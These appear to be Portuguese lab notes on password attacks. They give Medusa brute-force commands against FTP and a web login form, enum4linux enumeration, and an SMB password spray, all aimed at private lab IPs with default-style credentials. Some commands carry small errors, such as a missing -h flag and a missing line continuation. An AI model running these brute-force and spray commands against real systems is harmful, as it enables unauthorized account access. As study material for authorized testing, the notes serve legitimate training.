# Medusa ferramenta usada para ataque de força bruta que explora protocolos com SSH, UFTP, HTTP, Telnet, SMB entre outros.
# opera em multi thread podendo ser usado várias senhas simultaneamente. Vêm instalado de forma nativa no Kali linux
# não é tão eficaz para aplicação web.


# Tentativa de intrusão
# Crie senhas e usuários
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt  #criar arquivos para  usuários
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt  # criar arquivos para  senhas
medusa 192.168.10.105 -U users.txt -P pass.txt -M ftp -t 6 # comando que tenta logar no host usando senhas 
# e usuários das listas dos arquivos pass.txt e users.txt no serviço FTP, usando 6 threads simultaneo. Se
# der certo aparecerá successful use o ultimo parametro para tentar logae de forma manual.

# Ataque de força bruta em formulário de ligin web
# Fn F12  # na página para abrir o modo desenvolvedor (inspecionar elementos) ao clicar em network erá possivel vê 
#o que é enviado e recebido


# Criando Wordlist
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
# O comando a seguir é o que de fato vai tentar invadir um site usando as word list criada
# verificando combinações de usuários e senhas para identificar possíveis credenciais válidas no servidor.

medusa -h 192.168.0.105 -U users.txt -P pass.txt -M http \
-m PAGE:'/xxxx/login.php'
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6

# Ataque a servidores SMB (compartilhamento do windows e linux) neste Ataque será uma senha para vários usuários
# usando o Password Spray que pode descobrir senhas fracas
enum4linux -a 192.168.212.11 | tee enum4_output.txt # comando que enumera usando todas as técnicas possíveis
# o ip especificado gravando em um arquivo txt as saídas desse ataque
less enum4_output.txt  #visualiza o as informações do arquivo enum4_ouput.txt, preesione q para sair.

# criar lista de alvo apartir dos usuários reais obtido pelo enum4
echo -e "user\nmsfadmin\nservice" > smb_users.txt   # criando lista de usuários alimentado pelo 
#arquivo smb_users.txt

echo -e "password\n123456\nwelcome123\nmsfadmin" > senhas_spray.txt  #comando para criar wordlist de prováveis
# senhas para ser usada com o medusa

medusa -h 192.168.212.11 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50   #comando que tenata identificar 
#credenciais válidas no serviço SMB do servidor 192.168.212.11, usando os dois arquivos de listas.
# -U smb_users.txt	Carrega a lista de usuários.
#-P senhas_spray.txt	Carrega a lista de senhas.
#-M smbnt	Seleciona o módulo de autenticação SMB/NTLM.
#-t 2	Executa até duas tentativas de autenticação em paralelo no host.
#-T 50	Define um tempo limite de 50 segundos para o host.
